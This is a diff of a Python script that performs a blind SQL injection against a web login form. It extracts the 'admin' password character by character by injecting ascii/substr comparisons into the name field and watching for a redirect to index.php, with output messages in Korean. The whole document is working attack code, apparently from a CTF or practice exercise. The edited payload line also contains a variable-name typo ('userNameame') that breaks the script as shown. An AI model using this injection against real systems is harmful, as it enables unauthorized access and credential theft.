@@ -10,15 +10,16 @@ removeList = "%(){}[]\'\""
 words = word.translate(str.maketrans('', '', removeList))
 print(words)
 
-name = "admin"
+
+userName = "admin"
+
 
 password = ""
-
 iscorect = False
 while not iscorect:
     for c in words:
         data = {
-            "name": f"{name}' AND password LIKE '{password + c}%' -- --", 
+            "name": f"{userNameame}' AND ascii(substr(password, {len(password)} + 1, 1)) = {ord(c)} -- --", 
             "password": f"{password + c}"
         }
         r = requests.post(url, data=data)
@@ -33,11 +34,11 @@ while not iscorect:
         if "index.php" in r.url:
             password += c
             print()
-            print(F"{name}의 비밀번호: {password}")
+            print(F"{userName}의 비밀번호: {password}")
             iscorect = True
             break
 
     else:
         print()
-        print(F"{name}의 비밀번호: {password} 알 수 없음")
+        print(F"{userName}의 비밀번호: {password} 알 수 없음")
         break
